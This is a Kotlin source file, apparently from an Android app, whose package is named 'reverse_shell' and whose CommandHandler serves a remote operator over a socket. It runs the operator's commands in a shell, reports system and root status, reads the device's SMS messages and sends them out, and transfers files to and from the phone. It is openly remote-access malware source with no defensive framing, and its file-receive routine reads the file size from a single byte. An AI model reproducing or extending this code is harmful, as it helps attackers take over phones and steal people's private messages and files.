package com.satwik.nexgenius.core.reverse_shell

import android.content.Context
import java.io.FileOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.Socket

object CommandHandler {

    fun handleSysInfo(socketOutput: OutputStream) {
        socketOutput.write((getSystemInfo() + "\n").toByteArray())
        socketOutput.flush()
    }

    fun handleCheckRoot(socketOutput: OutputStream) {
        socketOutput.write((checkRoot() + "\n").toByteArray())
        socketOutput.flush()
    }

    fun handleHelp(socketOutput: OutputStream) {
        socketOutput.write((help() + "\n").toByteArray())
        socketOutput.flush()
    }

    fun handleExit(socket: Socket, process: Process) {
        socket.close()
        process.destroy()
    }

    fun handleGetSms(socketOutput: OutputStream, context: Context) {
        socketOutput.write((getSms(context) + "\n").toByteArray())
        socketOutput.flush()
    }

    fun handleShellCommand(command: String, shellOutput: OutputStream) {
        shellOutput.write((command + "\n").toByteArray())
        shellOutput.flush()
    }

    fun handleDownload(command: String, socketOutput: OutputStream, socketInput: InputStream) {
        val filePath = command.substringAfter("download ").trim()
        val sendResult = sendFile(filePath, socketOutput)
        socketOutput.write((sendResult + "\n").toByteArray())

        val fileName = filePath.substringAfterLast('/')
        receiveFile(socketInput, fileName)

        socketOutput.write((filePath + "\n").toByteArray())
        socketOutput.flush()
    }



    private fun receiveFile(socketInput: InputStream, fileName: String){
        println("Receive")
        FileOutputStream(fileName).use { fileOutputStream ->
            val size = socketInput.read().toLong() // read file size
            val buffer = ByteArray(4 * 1024)
            var bytesRead = 0
            var remainingSize = size

            while (remainingSize > 0 && socketInput.read(buffer, 0, minOf(buffer.size, remainingSize.toInt())).also { bytesRead = it } != -1) {
                // Here we write the file using write method
                fileOutputStream.write(buffer, 0, bytesRead)
                remainingSize -= bytesRead // read up to file size
            }
            fileOutputStream.close()
            println("File received")
        }

    }

}